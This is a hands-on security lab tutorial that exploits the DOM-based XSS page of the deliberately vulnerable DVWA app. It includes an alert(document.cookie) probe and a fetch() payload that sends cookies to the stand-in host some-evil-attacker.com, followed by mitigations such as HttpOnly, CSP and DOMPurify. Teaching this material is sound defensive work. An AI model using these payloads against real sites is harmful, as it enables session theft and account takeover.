## 🔍 Lab 4: DOM-Based XSS – Stealing document.cookie

### 💼 Scenario
A developer chat tool renders user input without output encoding. Stored XSS impacts all logged-in users.

### 🔧 Prerequisites

- DVWA running locally (http://localhost:4280)
- DVWA Security Level set to **Low**
- A web browser with DevTools (Chrome/Firefox)

### 🎯 Objective
In this lab, we will:

- Identify a **DOM-based XSS** vulnerability in DVWA.
- Exploit the vulnerability to **steal cookies** using document.cookie.
- Simulate an attacker-controlled server to **capture stolen cookies**.
- Discuss how to mitigate DOM-based XSS.

### 🔍 What is DOM-Based XSS?

**DOM-based XSS** happens when JavaScript in the page directly uses user input from the DOM **without validation or encoding**, often through:

```js
document.location
document.URL
document.write
element.innerHTML
```

It’s different from stored/reflected XSS because **the server doesn’t see the payload** — it happens entirely on the client side.

### 🧪 Steps

1. Set security level to **Low**

2. Navigate to XSS (DOM) from the left panel

3. Choose a language from the drop down and click on `Select`. This script takes the value of `default` from the URL and directly writes it to the page without any encoding or sanitization — a perfect spot for a DOM-based XSS attack. (You can do view source of the web page and search for `default=`).

4. Let's get the `cookies` from the browser. Add the below script to the URL.

```html
?default=<script>alert(document.cookie);</script>
```
If we are able to get the cookies, the attacker can also forward them to a remote server without even the client knowing.

5. Craft the Attack Payload.

```html
?default=<script>fetch("http://some-evil-attacker.com/log?c=" + document.cookie);</script>
```
Open the developer tools and you will see the cookie information being sent to `some-evil-attacker.com` with the cookie information.
Now the attacker can:

- Use the stolen **session ID** in the cookie to impersonate the user.
- Access the application as the user (admin, perhaps).
- Perform actions (view/edit data, change password, etc.) without needing login credentials.

### 🚨 What an Attacker Does:

An attacker who discovers an **XSS vulnerability** can **inject a script** that runs in your browser — **as if you typed it yourself**. This means:

- The attacker **doesn't need physical access** to your machine.
- They exploit a website’s poor input handling to **run malicious JavaScript** in your browser.
- That script can read your document.cookie and **send it to a server they control**.


### 🧠 Real-World Context

XSS is commonly exploited in chat tools, comments, and admin panels. It enables phishing, malware drops, and impersonation.

### 🛡️ Mitigation: 
1. **Use HttpOnly Cookies**:

Modern sites often set cookies with the HttpOnly flag:

```js
Set-Cookie: sessionid=abc123; HttpOnly
```

Such cookies **cannot be accessed via JavaScript**, so even if XSS is present, stealing cookies won’t work this way.
That’s why **defense-in-depth** is so important:

- Use `HttpOnly` and `Secure` flags.
- Escape/encode user input.
- Implement Content Security Policy (CSP).
- Sanitize output based on context (HTML, JS, URL, etc.).

2. **Don’t use `document.write`**

Use safer alternatives like `textContent` instead of `innerHTML`.

3. **Sanitize User Input**

Use libraries like [DOMPurify](https://github.com/cure53/DOMPurify) to clean input.

4. **Implement a Content Security Policy (CSP)**

Prevent inline scripts and control external script sources.